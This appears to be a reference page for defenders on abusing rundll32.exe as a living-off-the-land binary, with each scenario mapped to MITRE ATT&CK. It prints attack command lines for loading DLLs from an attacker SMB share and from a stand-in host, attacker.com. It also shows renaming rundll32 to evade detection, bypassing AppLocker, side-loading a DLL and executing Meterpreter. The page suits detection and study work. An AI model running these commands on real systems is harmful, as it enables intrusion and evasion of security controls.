# LOLBins — rundll32.exe — Hands-On Use Cases

Every scenario below relies on the DLL-loading and export-invocation mechanics documented in `01 - Overview.md` — DLL code executes inside `rundll32.exe`'s process. What changes per scenario is the DLL source (local, remote, UNC), the export function specified, and how the technique chains with an intrusion. MITRE ATT&CK ID(s) are tagged per scenario.

## Contents
- [Direct Malicious DLL Execution](#direct-malicious-dll-execution)
- [Local Malicious DLL Loading](#local-malicious-dll-loading)
- [UNC Path DLL Loading](#unc-path-dll-loading)
- [Chained Download-and-Execute One-Liner](#chained-download-and-execute-one-liner)
- [Control Panel Abuse (shell.cpl)](#control-panel-abuse-shellcpl)
- [Renamed or Relocated Binary](#renamed-or-relocated-binary)
- [Bypassing AppLocker via Microsoft-Signed Binary](#bypassing-applock-via-microsoft-signed-binary)
- [DLL Side-Loading / Proxy Execution](#dll-side-loading--proxy-execution)
- [Staged Secondary C2 Payload](#staged-secondary-c2-payload)
- [Meterpreter DLL Execution](#meterpreter-dll-execution)
- [Legitimate-Baseline Contrast](#legitimate-baseline-contrast)

---

## Direct Malicious DLL Execution

**MITRE ATT&CK:** [T1204.002](https://attack.mitre.org/techniques/T1204/002/) (User Execution: Malicious File) or [T1218.011](https://attack.mitre.org/techniques/T1218/011/) (System Binary Proxy Execution: Rundll32)

```cmd
rundll32.exe C:\Users\Public\malicious.dll ExportedFunction
```

The canonical rundll32 abuse: specify a local path to an attacker-authored DLL and the export function to call. The DLL is loaded into rundll32's process, and the specified export is invoked, running arbitrary code inside the rundll32 process address space.

## Local Malicious DLL Loading

**MITRE ATT&CK:** T1204.002

```cmd
rundll32.exe C:\Windows\Temp\payload.dll Run
```

Loads a pre-staged malicious DLL from a known temporary location. Common where the DLL was dropped via a prior delivery mechanism (macro, script, download).

## UNC Path DLL Loading

**MITRE ATT&CK:** T1570 (Lateral Tool Transfer), [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer)

```cmd
rundll32.exe \\198.51.100.12\attacker_share\payload.dll DllMain
```

Loads the DLL from an attacker-controlled SMB share. No outbound Internet required; SMB connectivity only. The operator controls the share and provides the DLL on demand.

## Chained Download-and-Execute One-Liner

**MITRE ATT&CK:** T1105

```powershell
# PowerShell variant (may require -Bypass or -ExecutionPolicy Bypass)
powershell -Command "rundll32.exe C:\Windows\Temp\payload.dll EntryPoint"

# cmd.exe variant
cmd.exe /c "rundll32.exe http://attacker.com/payload.dll DllMain"
```

The rundll32 command embedded in a parent shell. Common when the initial foothold is via macro or script-injection.

## Control Panel Abuse (shell.cpl)

**MITRE ATT&CK:** T1218.011

```cmd
rundll32.exe shell32.dll Control_RunDLL desk.cpl
```

Abuse of a legitimate Windows DLL export to launch GUI control panels. While this example opens the Display Control Panel (benign), the technique can be chained with other attacks. Relatively rare as a standalone abuse vector but documented by the community.

## Renamed or Relocated Binary

**MITRE ATT&CK:** T1036.003 (Masquerading: Rename System Utilities)

```cmd
copy C:\Windows\System32\rundll32.exe C:\Users\Public\svchost_update.exe
C:\Users\Public\svchost_update.exe C:\Users\Public\malicious.dll Run
```

Copies rundll32 under a different name, defeating detection rules keyed on `Image` = `rundll32.exe`. Authenticode/file-hash checks still identify it as Microsoft-signed rundll32.

## Bypassing AppLocker via Microsoft-Signed Binary

**MITRE ATT&CK:** T1218.011

```cmd
rundll32.exe C:\Users\Public\payload.dll EntryPoint
```

`rundll32.exe` is Microsoft-signed and shipped with the OS — nearly all application-control policies allowlist it by default. An attacker can use rundll32 to load and run malicious code (in the attacker-authored DLL) without triggering blocks on `cmd.exe` or `powershell.exe`.

## DLL Side-Loading / Proxy Execution

**MITRE ATT&CK:** [T1574.001](https://attack.mitre.org/techniques/T1574/001/) (Hijacking Execution Flow: DLL Search Order Hijacking), [T1574.002](https://attack.mitre.org/techniques/T1574/002/) (DLL Side-Loading)

```cmd
rundll32.exe comctl32.dll DllMain
```

where an attacker-authored `comctl32.dll` is placed in the current working directory or in a PATH-accessible location before the system version. When rundll32 tries to load `comctl32.dll`, it finds the attacker's version first. The attacker's DLL is loaded and its DllMain is invoked.

## Staged Secondary C2 Payload

**MITRE ATT&CK:** T1105

An operator with an initial foothold tasks a stager to:

```cmd
rundll32.exe C:\Windows\Temp\stager.dll Stage2
```

where `stager.dll` downloads and runs the full C2 agent (Cobalt Strike beacon, Sliver, Metasploit meterpreter, etc.). The rundll32 process is the delivery vehicle; once the agent runs, the target's evidence trail gains a second layer specific to that C2 framework.

## Meterpreter DLL Execution

**MITRE ATT&CK:** T1105, [T1559.001](https://attack.mitre.org/techniques/T1559/001/) (Inter-Process Communication: Component Object Model)

A common real-world pattern: `msfvenom` generates a Metasploit Meterpreter payload in DLL format, staged on the target, then executed:

```cmd
rundll32.exe meterpreter_x86.dll,ReflectiveLoader
```

The DLL is a compiled Metasploit Meterpreter (either generated via `msfvenom -f dll` or a post-exploitation module that drops a DLL). The `ReflectiveLoader` export is a reflective-DLL-injection technique that loads the Meterpreter into memory with minimal footprint.

## Legitimate-Baseline Contrast

Not an attack — included so an analyst can recognize the noise floor:

```cmd
rundll32.exe keymgr.dll,KRShowKeyMgr
rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl
```

An administrator or Windows setup routine launching system utilities via legitimate DLL exports. These target known Windows system DLLs with well-documented export names, not attacker-controlled paths.
